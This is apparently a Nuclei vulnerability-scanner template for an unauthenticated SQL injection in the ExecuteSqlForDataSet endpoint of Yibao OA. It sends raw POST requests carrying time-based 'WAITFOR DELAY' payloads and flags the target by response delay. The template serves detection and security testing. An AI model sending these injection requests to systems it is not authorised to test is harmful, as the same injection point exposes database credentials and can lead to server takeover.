id: yboa-ExecuteSqlForDataSet-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 易宝OA ExecuteSqlForDataSet接口处存在SQL注入漏洞，未经身份认证的攻击者可以通过此漏洞获取数据库敏感信息，用户名密码等凭据，进一步利用可获取服务器权限。
  reference:
    - http://kpanda.wiki/#/Vulnhub/Y6-6%E6%98%93%E5%AE%9D-OA-SQL?id=y6-6%e6%98%93%e5%ae%9d-oa-sql
  tags: tags
http:
  - raw:
      - |-
        POST /api/system/ExecuteSqlForDataSet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36

        token=zxh&sql=;WAITFOR DELAY '0:0:3'--&strParameters
      - |-
        POST /api/system/ExecuteSqlForDataSet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36

        token=zxh&sql=;WAITFOR DELAY '0:0:6'--&strParameters
      - |-
        POST /api/system/ExecuteSqlForDataSet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36

        token=zxh&sql=;WAITFOR DELAY '0:0:9'--&strParameters
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"